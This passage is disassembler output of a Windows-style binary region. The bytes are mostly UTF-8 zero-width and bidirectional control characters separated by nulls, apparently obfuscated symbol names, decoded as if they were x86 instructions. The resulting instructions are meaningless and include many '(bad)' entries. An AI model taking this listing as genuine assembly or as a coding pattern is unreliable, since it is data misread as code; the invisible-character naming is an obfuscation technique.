  408212:	e2 80                	loop   0x408194
  408214:	8b e2                	mov    %edx,%esp
  408216:	81 aa e2 80 ab e2 80 	subl   $0x80e2aa80,-0x1d547f1e(%edx)
  40821d:	aa e2 80 
  408220:	8c e2                	mov    %fs,%edx
  408222:	80 ab e2 81 ac e2 80 	subb   $0x80,-0x1d537e1e(%ebx)
  408229:	8f                   	(bad)
  40822a:	e2 81                	loop   0x4081ad
  40822c:	ac                   	lods   %ds:(%esi),%al
  40822d:	e2 80                	loop   0x4081af
  40822f:	8b e2                	mov    %edx,%esp
  408231:	81 ac e2 80 ac e2 81 	subl   $0x8b80e2aa,-0x7e1d5380(%edx,%eiz,8)
  408238:	aa e2 80 8b 
  40823c:	e2 80                	loop   0x4081be
  40823e:	ad                   	lods   %ds:(%esi),%eax
  40823f:	e2 80                	loop   0x4081c1
  408241:	aa                   	stos   %al,%es:(%edi)
  408242:	e2 81                	loop   0x4081c5
  408244:	ac                   	lods   %ds:(%esi),%al
  408245:	e2 81                	loop   0x4081c8
  408247:	ad                   	lods   %ds:(%esi),%eax
  408248:	e2 80                	loop   0x4081ca
  40824a:	aa                   	stos   %al,%es:(%edi)
  40824b:	e2 80                	loop   0x4081cd
  40824d:	8b e2                	mov    %edx,%esp
  40824f:	80 ae e2 81 ab e2 81 	subb   $0x81,-0x1d547e1e(%esi)
  408256:	aa                   	stos   %al,%es:(%edi)
  408257:	e2 80                	loop   0x4081d9
  408259:	8e e2                	mov    %edx,%fs
  40825b:	80 ae 00 e2 80 8d e2 	subb   $0xe2,-0x727f1e00(%esi)
  408262:	80 ab e2 81 ac e2 81 	subb   $0x81,-0x1d537e1e(%ebx)
  408269:	ad                   	lods   %ds:(%esi),%eax
  40826a:	e2 80                	loop   0x4081ec
  40826c:	8f                   	(bad)
  40826d:	e2 81                	loop   0x4081f0
  40826f:	af                   	scas   %es:(%edi),%eax
  408270:	e2 81                	loop   0x4081f3
  408272:	aa                   	stos   %al,%es:(%edi)
  408273:	e2 81                	loop   0x4081f6
  408275:	ad                   	lods   %ds:(%esi),%eax
  408276:	e2 81                	loop   0x4081f9
  408278:	aa                   	stos   %al,%es:(%edi)
  408279:	e2 80                	loop   0x4081fb
  40827b:	8d                   	lea    (bad),%esp
  40827c:	e2 81                	loop   0x4081ff
  40827e:	ac                   	lods   %ds:(%esi),%al
  40827f:	e2 80                	loop   0x408201
  408281:	8e e2                	mov    %edx,%fs
  408283:	80 ae e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%esi)
  40828a:	8f                   	(bad)
  40828b:	e2 80                	loop   0x40820d
  40828d:	8c e2                	mov    %fs,%edx
  40828f:	80 ad e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%ebp)
  408296:	aa                   	stos   %al,%es:(%edi)
  408297:	e2 80                	loop   0x408219
  408299:	8f                   	(bad)
  40829a:	e2 80                	loop   0x40821c
  40829c:	ad                   	lods   %ds:(%esi),%eax
  40829d:	e2 80                	loop   0x40821f
  40829f:	8e e2                	mov    %edx,%fs
  4082a1:	80 ae e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%esi)
  4082a8:	8c e2                	mov    %fs,%edx
  4082aa:	80 ad e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%ebp)
  4082b1:	8d                   	lea    (bad),%esp
  4082b2:	e2 81                	loop   0x408235
  4082b4:	ab                   	stos   %eax,%es:(%edi)
  4082b5:	e2 80                	loop   0x408237
  4082b7:	ad                   	lods   %ds:(%esi),%eax
  4082b8:	e2 81                	loop   0x40823b
  4082ba:	ac                   	lods   %ds:(%esi),%al
  4082bb:	e2 80                	loop   0x40823d
  4082bd:	ad                   	lods   %ds:(%esi),%eax
  4082be:	e2 80                	loop   0x408240
  4082c0:	8f                   	(bad)
  4082c1:	e2 80                	loop   0x408243
  4082c3:	8f                   	(bad)
  4082c4:	e2 80                	loop   0x408246
  4082c6:	8f                   	(bad)
  4082c7:	e2 80                	loop   0x408249
  4082c9:	ae                   	scas   %es:(%edi),%al
  4082ca:	e2 80                	loop   0x40824c
  4082cc:	8c e2                	mov    %fs,%edx
  4082ce:	81 ae e2 81 ab e2 80 	subl   $0x80e28e80,-0x1d547e1e(%esi)
  4082d5:	8e e2 80 
  4082d8:	ae                   	scas   %es:(%edi),%al
  4082d9:	00 e2                	add    %ah,%dl
  4082db:	80 ac e2 80 8d e2 81 	subb   $0xad,-0x7e1d7280(%edx,%eiz,8)
  4082e2:	ad 
  4082e3:	e2 80                	loop   0x408265
  4082e5:	8f                   	(bad)
  4082e6:	e2 80                	loop   0x408268
  4082e8:	aa                   	stos   %al,%es:(%edi)
  4082e9:	e2 80                	loop   0x40826b
  4082eb:	ae                   	scas   %es:(%edi),%al
  4082ec:	e2 80                	loop   0x40826e
  4082ee:	ab                   	stos   %eax,%es:(%edi)
  4082ef:	e2 81                	loop   0x408272
  4082f1:	aa                   	stos   %al,%es:(%edi)
  4082f2:	e2 81                	loop   0x408275
  4082f4:	ab                   	stos   %eax,%es:(%edi)
  4082f5:	e2 80                	loop   0x408277
  4082f7:	ae                   	scas   %es:(%edi),%al
  4082f8:	e2 81                	loop   0x40827b
  4082fa:	ae                   	scas   %es:(%edi),%al
  4082fb:	e2 81                	loop   0x40827e
  4082fd:	aa                   	stos   %al,%es:(%edi)
  4082fe:	e2 81                	loop   0x408281
  408300:	ae                   	scas   %es:(%edi),%al
  408301:	e2 80                	loop   0x408283
  408303:	8e e2                	mov    %edx,%fs
  408305:	81 ab e2 80 ab e2 80 	subl   $0x81e2aa80,-0x1d547f1e(%ebx)
  40830c:	aa e2 81 
  40830f:	ae                   	scas   %es:(%edi),%al
  408310:	e2 80                	loop   0x408292
  408312:	ab                   	stos   %eax,%es:(%edi)
  408313:	e2 81                	loop   0x408296
  408315:	aa                   	stos   %al,%es:(%edi)
  408316:	e2 80                	loop   0x408298
  408318:	8e e2                	mov    %edx,%fs
  40831a:	81 ac e2 80 ad e2 80 	subl   $0xac81e2ad,-0x7f1d5280(%edx,%eiz,8)
  408321:	ad e2 81 ac 
  408325:	e2 80                	loop   0x4082a7
  408327:	8d                   	lea    (bad),%esp
  408328:	e2 80                	loop   0x4082aa
  40832a:	8e e2                	mov    %edx,%fs
  40832c:	80 8d e2 80 ab e2 81 	orb    $0x81,-0x1d547f1e(%ebp)
  408333:	af                   	scas   %es:(%edi),%eax
  408334:	e2 80                	loop   0x4082b6
  408336:	ac                   	lods   %ds:(%esi),%al
  408337:	e2 80                	loop   0x4082b9
  408339:	8d                   	lea    (bad),%esp
  40833a:	e2 80                	loop   0x4082bc
  40833c:	ae                   	scas   %es:(%edi),%al
  40833d:	e2 80                	loop   0x4082bf
  40833f:	ab                   	stos   %eax,%es:(%edi)
  408340:	e2 80                	loop   0x4082c2
  408342:	8c e2                	mov    %fs,%edx
  408344:	80 8e e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%esi)
  40834b:	8e e2                	mov    %edx,%fs
  40834d:	81 ae e2 80 8e e2 80 	subl   $0xe200ae80,-0x1d717f1e(%esi)
  408354:	ae 00 e2 
  408357:	81 ac e2 81 ae e2 80 	subl   $0xad81e28b,-0x7f1d517f(%edx,%eiz,8)
  40835e:	8b e2 81 ad 
  408362:	e2 81                	loop   0x4082e5
  408364:	ad                   	lods   %ds:(%esi),%eax
  408365:	e2 81                	loop   0x4082e8
  408367:	ac                   	lods   %ds:(%esi),%al
  408368:	e2 80                	loop   0x4082ea
  40836a:	ae                   	scas   %es:(%edi),%al
  40836b:	e2 80                	loop   0x4082ed
  40836d:	aa                   	stos   %al,%es:(%edi)
  40836e:	e2 80                	loop   0x4082f0
  408370:	8c e2                	mov    %fs,%edx
  408372:	81 af e2 80 ac e2 81 	subl   $0x81e2ac81,-0x1d537f1e(%edi)
  408379:	ac e2 81 
  40837c:	ae                   	scas   %es:(%edi),%al
  40837d:	e2 80                	loop   0x4082ff
  40837f:	ae                   	scas   %es:(%edi),%al
  408380:	e2 80                	loop   0x408302
  408382:	8f                   	(bad)
  408383:	e2 80                	loop   0x408305
  408385:	aa                   	stos   %al,%es:(%edi)
  408386:	e2 80                	loop   0x408308
  408388:	8d                   	lea    (bad),%esp
  408389:	e2 80                	loop   0x40830b
  40838b:	8d                   	lea    (bad),%esp
  40838c:	e2 80                	loop   0x40830e
  40838e:	8f                   	(bad)
  40838f:	e2 80                	loop   0x408311
  408391:	8e e2                	mov    %edx,%fs
  408393:	81 ab e2 80 8b e2 80 	subl   $0x80e28b80,-0x1d747f1e(%ebx)
  40839a:	8b e2 80 
  40839d:	ab                   	stos   %eax,%es:(%edi)
  40839e:	e2 81                	loop   0x408321
  4083a0:	ae                   	scas   %es:(%edi),%al
  4083a1:	e2 80                	loop   0x408323
  4083a3:	8f                   	(bad)
  4083a4:	e2 81                	loop   0x408327
  4083a6:	ab                   	stos   %eax,%es:(%edi)
  4083a7:	e2 80                	loop   0x408329
  4083a9:	8f                   	(bad)
  4083aa:	e2 81                	loop   0x40832d
  4083ac:	af                   	scas   %es:(%edi),%eax
  4083ad:	e2 80                	loop   0x40832f
  4083af:	ae                   	scas   %es:(%edi),%al
  4083b0:	e2 80                	loop   0x408332
  4083b2:	ab                   	stos   %eax,%es:(%edi)
  4083b3:	e2 80                	loop   0x408335
  4083b5:	8d                   	lea    (bad),%esp
  4083b6:	e2 80                	loop   0x408338
  4083b8:	ab                   	stos   %eax,%es:(%edi)
  4083b9:	e2 81                	loop   0x40833c
  4083bb:	af                   	scas   %es:(%edi),%eax
  4083bc:	e2 80                	loop   0x40833e
  4083be:	8c e2                	mov    %fs,%edx
  4083c0:	80 8d e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%ebp)
  4083c7:	ad                   	lods   %ds:(%esi),%eax
  4083c8:	e2 81                	loop   0x40834b
  4083ca:	af                   	scas   %es:(%edi),%eax
  4083cb:	e2 80                	loop   0x40834d
  4083cd:	8e e2                	mov    %edx,%fs
  4083cf:	80 ae 00 e2 81 ae e2 	subb   $0xe2,-0x517e1e00(%esi)
  4083d6:	80 8b e2 80 aa e2 81 	orb    $0x81,-0x1d557f1e(%ebx)
  4083dd:	ab                   	stos   %eax,%es:(%edi)
  4083de:	e2 80                	loop   0x408360
  4083e0:	8c e2                	mov    %fs,%edx
  4083e2:	80 8c e2 80 ab e2 81 	orb    $0xab,-0x7e1d5480(%edx,%eiz,8)
  4083e9:	ab 
  4083ea:	e2 81                	loop   0x40836d
  4083ec:	aa                   	stos   %al,%es:(%edi)
  4083ed:	e2 80                	loop   0x40836f
  4083ef:	8b e2                	mov    %edx,%esp
  4083f1:	80 aa e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%edx)
  4083f8:	ad                   	lods   %ds:(%esi),%eax
  4083f9:	e2 80                	loop   0x40837b
  4083fb:	8b e2                	mov    %edx,%esp
  4083fd:	80 aa e2 81 aa e2 81 	subb   $0x81,-0x1d557e1e(%edx)
  408404:	ae                   	scas   %es:(%edi),%al
  408405:	e2 80                	loop   0x408387
  408407:	8b e2                	mov    %edx,%esp
  408409:	80 8f e2 81 af e2 81 	orb    $0x81,-0x1d507e1e(%edi)
  408410:	ac                   	lods   %ds:(%esi),%al
  408411:	e2 80                	loop   0x408393
  408413:	8e e2                	mov    %edx,%fs
  408415:	80 8f e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%edi)
  40841c:	ac                   	lods   %ds:(%esi),%al
  40841d:	e2 80                	loop   0x40839f
  40841f:	ab                   	stos   %eax,%es:(%edi)
  408420:	e2 80                	loop   0x4083a2
  408422:	ad                   	lods   %ds:(%esi),%eax
  408423:	e2 81                	loop   0x4083a6
  408425:	ae                   	scas   %es:(%edi),%al
  408426:	e2 80                	loop   0x4083a8
  408428:	8e e2                	mov    %edx,%fs
  40842a:	80 ab e2 80 ad e2 81 	subb   $0x81,-0x1d527f1e(%ebx)
  408431:	ab                   	stos   %eax,%es:(%edi)
  408432:	e2 80                	loop   0x4083b4
  408434:	aa                   	stos   %al,%es:(%edi)
  408435:	e2 80                	loop   0x4083b7
  408437:	8b e2                	mov    %edx,%esp
  408439:	81 ac e2 80 8f e2 81 	subl   $0xae80e2ae,-0x7e1d7080(%edx,%eiz,8)
  408440:	ae e2 80 ae 
  408444:	e2 80                	loop   0x4083c6
  408446:	8c e2                	mov    %fs,%edx
  408448:	80 8f e2 80 ae 00 e2 	orb    $0xe2,0xae80e2(%edi)
  40844f:	80 8f e2 81 af e2 81 	orb    $0x81,-0x1d507e1e(%edi)
  408456:	af                   	scas   %es:(%edi),%eax
  408457:	e2 80                	loop   0x4083d9
  408459:	ac                   	lods   %ds:(%esi),%al
  40845a:	e2 81                	loop   0x4083dd
  40845c:	ae                   	scas   %es:(%edi),%al
  40845d:	e2 80                	loop   0x4083df
  40845f:	8e e2                	mov    %edx,%fs
  408461:	80 8f e2 80 ad e2 81 	orb    $0x81,-0x1d527f1e(%edi)
  408468:	aa                   	stos   %al,%es:(%edi)
  408469:	e2 80                	loop   0x4083eb
  40846b:	8f                   	(bad)
  40846c:	e2 81                	loop   0x4083ef
  40846e:	ac                   	lods   %ds:(%esi),%al
  40846f:	e2 81                	loop   0x4083f2
  408471:	aa                   	stos   %al,%es:(%edi)
  408472:	e2 80                	loop   0x4083f4
  408474:	8f                   	(bad)
  408475:	e2 80                	loop   0x4083f7
  408477:	ad                   	lods   %ds:(%esi),%eax
  408478:	e2 81                	loop   0x4083fb
  40847a:	af                   	scas   %es:(%edi),%eax
  40847b:	e2 81                	loop   0x4083fe
  40847d:	aa                   	stos   %al,%es:(%edi)
  40847e:	e2 80                	loop   0x408400
  408480:	8c e2                	mov    %fs,%edx
  408482:	80 ac e2 80 8f e2 81 	subb   $0xab,-0x7e1d7080(%edx,%eiz,8)
  408489:	ab 
  40848a:	e2 80                	loop   0x40840c
  40848c:	ad                   	lods   %ds:(%esi),%eax
  40848d:	e2 80                	loop   0x40840f
  40848f:	8c e2                	mov    %fs,%edx
  408491:	81 aa e2 81 ab e2 80 	subl   $0x80e28c80,-0x1d547e1e(%edx)
  408498:	8c e2 80 
  40849b:	8c e2                	mov    %fs,%edx
  40849d:	81 ae e2 80 8d e2 80 	subl   $0x81e2ab80,-0x1d727f1e(%esi)
  4084a4:	ab e2 81 
  4084a7:	ae                   	scas   %es:(%edi),%al
  4084a8:	e2 80                	loop   0x40842a
  4084aa:	ac                   	lods   %ds:(%esi),%al
  4084ab:	e2 80                	loop   0x40842d
  4084ad:	8f                   	(bad)
  4084ae:	e2 80                	loop   0x408430
  4084b0:	8f                   	(bad)
  4084b1:	e2 81                	loop   0x408434
  4084b3:	ac                   	lods   %ds:(%esi),%al
  4084b4:	e2 81                	loop   0x408437
  4084b6:	ab                   	stos   %eax,%es:(%edi)
  4084b7:	e2 80                	loop   0x408439
  4084b9:	aa                   	stos   %al,%es:(%edi)
  4084ba:	e2 80                	loop   0x40843c
  4084bc:	8d                   	lea    (bad),%esp
  4084bd:	e2 81                	loop   0x408440
  4084bf:	ae                   	scas   %es:(%edi),%al
  4084c0:	e2 80                	loop   0x408442
  4084c2:	8f                   	(bad)
  4084c3:	e2 80                	loop   0x408445
  4084c5:	8f                   	(bad)
  4084c6:	e2 80                	loop   0x408448
  4084c8:	ae                   	scas   %es:(%edi),%al
  4084c9:	00 e2                	add    %ah,%dl
  4084cb:	80 8d e2 81 ad e2 81 	orb    $0x81,-0x1d527e1e(%ebp)
  4084d2:	ab                   	stos   %eax,%es:(%edi)
  4084d3:	e2 80                	loop   0x408455
  4084d5:	8c e2                	mov    %fs,%edx
  4084d7:	80 8e e2 81 aa e2 80 	orb    $0x80,-0x1d557e1e(%esi)
  4084de:	ac                   	lods   %ds:(%esi),%al
  4084df:	e2 81                	loop   0x408462
  4084e1:	ad                   	lods   %ds:(%esi),%eax
  4084e2:	e2 81                	loop   0x408465
  4084e4:	ae                   	scas   %es:(%edi),%al
  4084e5:	e2 80                	loop   0x408467
  4084e7:	8e e2                	mov    %edx,%fs
  4084e9:	81 ad e2 80 8f e2 81 	subl   $0x80e2ac81,-0x1d707f1e(%ebp)
  4084f0:	ac e2 80 
  4084f3:	ac                   	lods   %ds:(%esi),%al
  4084f4:	e2 80                	loop   0x408476
  4084f6:	ad                   	lods   %ds:(%esi),%eax
  4084f7:	e2 81                	loop   0x40847a
  4084f9:	af                   	scas   %es:(%edi),%eax
  4084fa:	e2 81                	loop   0x40847d
  4084fc:	aa                   	stos   %al,%es:(%edi)
  4084fd:	e2 80                	loop   0x40847f
  4084ff:	aa                   	stos   %al,%es:(%edi)
  408500:	e2 80                	loop   0x408482
  408502:	ac                   	lods   %ds:(%esi),%al
  408503:	e2 81                	loop   0x408486
  408505:	af                   	scas   %es:(%edi),%eax
  408506:	e2 80                	loop   0x408488
  408508:	ac                   	lods   %ds:(%esi),%al
  408509:	e2 81                	loop   0x40848c
  40850b:	ae                   	scas   %es:(%edi),%al
  40850c:	e2 80                	loop   0x40848e
  40850e:	8b e2                	mov    %edx,%esp
  408510:	80 8b e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebx)
  408517:	8f                   	(bad)
  408518:	e2 80                	loop   0x40849a
  40851a:	aa                   	stos   %al,%es:(%edi)
  40851b:	e2 80                	loop   0x40849d
  40851d:	ab                   	stos   %eax,%es:(%edi)
  40851e:	e2 80                	loop   0x4084a0
  408520:	8b e2                	mov    %edx,%esp
  408522:	81 aa e2 80 8e e2 80 	subl   $0x80e2ab80,-0x1d717f1e(%edx)
  408529:	ab e2 80 
  40852c:	8d                   	lea    (bad),%esp
  40852d:	e2 80                	loop   0x4084af
  40852f:	8f                   	(bad)
  408530:	e2 80                	loop   0x4084b2
  408532:	8d                   	lea    (bad),%esp
  408533:	e2 81                	loop   0x4084b6
  408535:	ab                   	stos   %eax,%es:(%edi)
  408536:	e2 81                	loop   0x4084b9
  408538:	ad                   	lods   %ds:(%esi),%eax
  408539:	e2 80                	loop   0x4084bb
  40853b:	aa                   	stos   %al,%es:(%edi)
  40853c:	e2 80                	loop   0x4084be
  40853e:	8f                   	(bad)
  40853f:	e2 80                	loop   0x4084c1
  408541:	ae                   	scas   %es:(%edi),%al
  408542:	00 e2                	add    %ah,%dl
  408544:	81 ab e2 80 aa e2 80 	subl   $0x81e2aa80,-0x1d557f1e(%ebx)
  40854b:	aa e2 81 
  40854e:	aa                   	stos   %al,%es:(%edi)
  40854f:	e2 81                	loop   0x4084d2
  408551:	ab                   	stos   %eax,%es:(%edi)
  408552:	e2 81                	loop   0x4084d5
  408554:	af                   	scas   %es:(%edi),%eax
  408555:	e2 81                	loop   0x4084d8
  408557:	af                   	scas   %es:(%edi),%eax
  408558:	e2 80                	loop   0x4084da
  40855a:	ac                   	lods   %ds:(%esi),%al
  40855b:	e2 81                	loop   0x4084de
  40855d:	ac                   	lods   %ds:(%esi),%al
  40855e:	e2 80                	loop   0x4084e0
  408560:	ae                   	scas   %es:(%edi),%al
  408561:	e2 80                	loop   0x4084e3
  408563:	ae                   	scas   %es:(%edi),%al
  408564:	e2 81                	loop   0x4084e7
  408566:	ab                   	stos   %eax,%es:(%edi)
  408567:	e2 80                	loop   0x4084e9
  408569:	ac                   	lods   %ds:(%esi),%al
  40856a:	e2 80                	loop   0x4084ec
  40856c:	8e e2                	mov    %edx,%fs
  40856e:	80 ae e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%esi)
  408575:	ab                   	stos   %eax,%es:(%edi)
  408576:	e2 80                	loop   0x4084f8
  408578:	ae                   	scas   %es:(%edi),%al
  408579:	e2 81                	loop   0x4084fc
  40857b:	ac                   	lods   %ds:(%esi),%al
  40857c:	e2 80                	loop   0x4084fe
  40857e:	8f                   	(bad)
  40857f:	e2 80                	loop   0x408501
  408581:	aa                   	stos   %al,%es:(%edi)
  408582:	e2 80                	loop   0x408504
  408584:	8e e2                	mov    %edx,%fs
  408586:	81 ae e2 80 ad e2 81 	subl   $0x80e2aa81,-0x1d527f1e(%esi)
  40858d:	aa e2 80 
  408590:	ac                   	lods   %ds:(%esi),%al
  408591:	e2 81                	loop   0x408514
  408593:	aa                   	stos   %al,%es:(%edi)
  408594:	e2 81                	loop   0x408517
  408596:	ac                   	lods   %ds:(%esi),%al
  408597:	e2 80                	loop   0x408519
  408599:	8c e2                	mov    %fs,%edx
  40859b:	80 8e e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%esi)
  4085a2:	ad                   	lods   %ds:(%esi),%eax
  4085a3:	e2 80                	loop   0x408525
  4085a5:	ad                   	lods   %ds:(%esi),%eax
  4085a6:	e2 81                	loop   0x408529
  4085a8:	ac                   	lods   %ds:(%esi),%al
  4085a9:	e2 80                	loop   0x40852b
  4085ab:	8c e2                	mov    %fs,%edx
  4085ad:	81 ae e2 80 8f e2 80 	subl   $0x81e28e80,-0x1d707f1e(%esi)
  4085b4:	8e e2 81 
  4085b7:	aa                   	stos   %al,%es:(%edi)
  4085b8:	e2 80                	loop   0x40853a
  4085ba:	8f                   	(bad)
  4085bb:	e2 80                	loop   0x40853d
  4085bd:	ae                   	scas   %es:(%edi),%al
  4085be:	00 e2                	add    %ah,%dl
  4085c0:	81 ac e2 81 af e2 81 	subl   $0x8b80e2ae,-0x7e1d507f(%edx,%eiz,8)
  4085c7:	ae e2 80 8b 
  4085cb:	e2 80                	loop   0x40854d
  4085cd:	aa                   	stos   %al,%es:(%edi)
  4085ce:	e2 80                	loop   0x408550
  4085d0:	ad                   	lods   %ds:(%esi),%eax
  4085d1:	e2 80                	loop   0x408553
  4085d3:	ad                   	lods   %ds:(%esi),%eax
  4085d4:	e2 80                	loop   0x408556
  4085d6:	ab                   	stos   %eax,%es:(%edi)
  4085d7:	e2 80                	loop   0x408559
  4085d9:	8b e2                	mov    %edx,%esp
  4085db:	80 ad e2 80 8f e2 80 	subb   $0x80,-0x1d707f1e(%ebp)
  4085e2:	8c e2                	mov    %fs,%edx
  4085e4:	80 8c e2 81 af e2 80 	orb    $0x8c,-0x7f1d507f(%edx,%eiz,8)
  4085eb:	8c 
  4085ec:	e2 80                	loop   0x40856e
  4085ee:	ad                   	lods   %ds:(%esi),%eax
  4085ef:	e2 80                	loop   0x408571
  4085f1:	8c e2                	mov    %fs,%edx
  4085f3:	81 ad e2 80 aa e2 81 	subl   $0x80e2ae81,-0x1d557f1e(%ebp)
  4085fa:	ae e2 80 
  4085fd:	8b e2                	mov    %edx,%esp
  4085ff:	80 8f e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%edi)
  408606:	ad                   	lods   %ds:(%esi),%eax
  408607:	e2 80                	loop   0x408589
  408609:	8e e2                	mov    %edx,%fs
  40860b:	80 ab e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebx)
  408612:	ab                   	stos   %eax,%es:(%edi)
  408613:	e2 80                	loop   0x408595
  408615:	8e e2                	mov    %edx,%fs
  408617:	80 8d e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebp)
  40861e:	ac                   	lods   %ds:(%esi),%al
  40861f:	e2 81                	loop   0x4085a2
  408621:	ab                   	stos   %eax,%es:(%edi)
  408622:	e2 81                	loop   0x4085a5
  408624:	af                   	scas   %es:(%edi),%eax
  408625:	e2 80                	loop   0x4085a7
  408627:	8b e2                	mov    %edx,%esp
  408629:	80 ae e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%esi)
  408630:	ad                   	lods   %ds:(%esi),%eax
  408631:	e2 80                	loop   0x4085b3
  408633:	ab                   	stos   %eax,%es:(%edi)
  408634:	e2 80                	loop   0x4085b6
  408636:	8f                   	(bad)
  408637:	e2 80                	loop   0x4085b9
  408639:	ae                   	scas   %es:(%edi),%al
  40863a:	00 e2                	add    %ah,%dl
  40863c:	80 8f e2 81 ab e2 81 	orb    $0x81,-0x1d547e1e(%edi)
  408643:	ab                   	stos   %eax,%es:(%edi)
  408644:	e2 80                	loop   0x4085c6
  408646:	ac                   	lods   %ds:(%esi),%al
  408647:	e2 80                	loop   0x4085c9
  408649:	8d                   	lea    (bad),%esp
  40864a:	e2 80                	loop   0x4085cc
  40864c:	ac                   	lods   %ds:(%esi),%al
  40864d:	e2 81                	loop   0x4085d0
  40864f:	af                   	scas   %es:(%edi),%eax
  408650:	e2 80                	loop   0x4085d2
  408652:	aa                   	stos   %al,%es:(%edi)
  408653:	e2 80                	loop   0x4085d5
  408655:	8d                   	lea    (bad),%esp
  408656:	e2 80                	loop   0x4085d8
  408658:	ad                   	lods   %ds:(%esi),%eax
  408659:	e2 80                	loop   0x4085db
  40865b:	8e e2                	mov    %edx,%fs
  40865d:	81 ab e2 80 8f e2 80 	subl   $0x80e28e80,-0x1d707f1e(%ebx)
  408664:	8e e2 80 
  408667:	ab                   	stos   %eax,%es:(%edi)
  408668:	e2 81                	loop   0x4085eb
  40866a:	ad                   	lods   %ds:(%esi),%eax
  40866b:	e2 80                	loop   0x4085ed
  40866d:	ad                   	lods   %ds:(%esi),%eax
  40866e:	e2 80                	loop   0x4085f0
  408670:	8e e2                	mov    %edx,%fs
  408672:	80 aa e2 80 8d e2 80 	subb   $0x80,-0x1d727f1e(%edx)
  408679:	ad                   	lods   %ds:(%esi),%eax
  40867a:	e2 80                	loop   0x4085fc
  40867c:	8d                   	lea    (bad),%esp
  40867d:	e2 81                	loop   0x408600
  40867f:	ad                   	lods   %ds:(%esi),%eax
  408680:	e2 80                	loop   0x408602
  408682:	ae                   	scas   %es:(%edi),%al
  408683:	e2 80                	loop   0x408605
  408685:	ad                   	lods   %ds:(%esi),%eax
  408686:	e2 81                	loop   0x408609
  408688:	ad                   	lods   %ds:(%esi),%eax
  408689:	e2 80                	loop   0x40860b
  40868b:	aa                   	stos   %al,%es:(%edi)
  40868c:	e2 81                	loop   0x40860f
  40868e:	ac                   	lods   %ds:(%esi),%al
  40868f:	e2 81                	loop   0x408612
  408691:	ad                   	lods   %ds:(%esi),%eax
  408692:	e2 80                	loop   0x408614
  408694:	aa                   	stos   %al,%es:(%edi)
  408695:	e2 80                	loop   0x408617
  408697:	ab                   	stos   %eax,%es:(%edi)
  408698:	e2 81                	loop   0x40861b
  40869a:	af                   	scas   %es:(%edi),%eax
  40869b:	e2 81                	loop   0x40861e
  40869d:	ac                   	lods   %ds:(%esi),%al
  40869e:	e2 80                	loop   0x408620
  4086a0:	ac                   	lods   %ds:(%esi),%al
  4086a1:	e2 81                	loop   0x408624
  4086a3:	af                   	scas   %es:(%edi),%eax
  4086a4:	e2 80                	loop   0x408626
  4086a6:	ae                   	scas   %es:(%edi),%al
  4086a7:	e2 80                	loop   0x408629
  4086a9:	ac                   	lods   %ds:(%esi),%al
  4086aa:	e2 81                	loop   0x40862d
  4086ac:	ac                   	lods   %ds:(%esi),%al
  4086ad:	e2 81                	loop   0x408630
  4086af:	ab                   	stos   %eax,%es:(%edi)
  4086b0:	e2 80                	loop   0x408632
  4086b2:	8f                   	(bad)
  4086b3:	e2 80                	loop   0x408635
  4086b5:	ae                   	scas   %es:(%edi),%al
  4086b6:	00 e2                	add    %ah,%dl
  4086b8:	81 af e2 80 ad e2 81 	subl   $0x80e2af81,-0x1d527f1e(%edi)
  4086bf:	af e2 80 
  4086c2:	8b e2                	mov    %edx,%esp
  4086c4:	80 8e e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%esi)
  4086cb:	8e e2                	mov    %edx,%fs
  4086cd:	81 ae e2 80 8e e2 80 	subl   $0x80e28d80,-0x1d717f1e(%esi)
  4086d4:	8d e2 80 
  4086d7:	ad                   	lods   %ds:(%esi),%eax
  4086d8:	e2 81                	loop   0x40865b
  4086da:	af                   	scas   %es:(%edi),%eax
  4086db:	e2 80                	loop   0x40865d
  4086dd:	ab                   	stos   %eax,%es:(%edi)
  4086de:	e2 81                	loop   0x408661
  4086e0:	aa                   	stos   %al,%es:(%edi)
  4086e1:	e2 80                	loop   0x408663
  4086e3:	ae                   	scas   %es:(%edi),%al
  4086e4:	e2 80                	loop   0x408666
  4086e6:	8b e2                	mov    %edx,%esp
  4086e8:	81 aa e2 81 aa e2 81 	subl   $0x80e2af81,-0x1d557e1e(%edx)
  4086ef:	af e2 80 
  4086f2:	8b e2                	mov    %edx,%esp
  4086f4:	80 ad e2 80 8f e2 80 	subb   $0x80,-0x1d707f1e(%ebp)
  4086fb:	8d                   	lea    (bad),%esp
  4086fc:	e2 80                	loop   0x40867e
  4086fe:	8d                   	lea    (bad),%esp
  4086ff:	e2 80                	loop   0x408681
  408701:	8b e2                	mov    %edx,%esp
  408703:	80 8c e2 80 ac e2 80 	orb    $0x8f,-0x7f1d5380(%edx,%eiz,8)
  40870a:	8f 
  40870b:	e2 80                	loop   0x40868d
  40870d:	ae                   	scas   %es:(%edi),%al
  40870e:	e2 81                	loop   0x408691
  408710:	ac                   	lods   %ds:(%esi),%al
  408711:	e2 80                	loop   0x408693
  408713:	ad                   	lods   %ds:(%esi),%eax
  408714:	e2 80                	loop   0x408696
  408716:	8b e2                	mov    %edx,%esp
  408718:	80 8d e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebp)
  40871f:	8d                   	lea    (bad),%esp
  408720:	e2 80                	loop   0x4086a2
  408722:	ac                   	lods   %ds:(%esi),%al
  408723:	e2 80                	loop   0x4086a5
  408725:	ac                   	lods   %ds:(%esi),%al
  408726:	e2 80                	loop   0x4086a8
  408728:	8d                   	lea    (bad),%esp
  408729:	e2 81                	loop   0x4086ac
  40872b:	ae                   	scas   %es:(%edi),%al
  40872c:	e2 80                	loop   0x4086ae
  40872e:	8f                   	(bad)
  40872f:	e2 80                	loop   0x4086b1
  408731:	ae                   	scas   %es:(%edi),%al
  408732:	00 e2                	add    %ah,%dl
  408734:	80 8b e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%ebx)
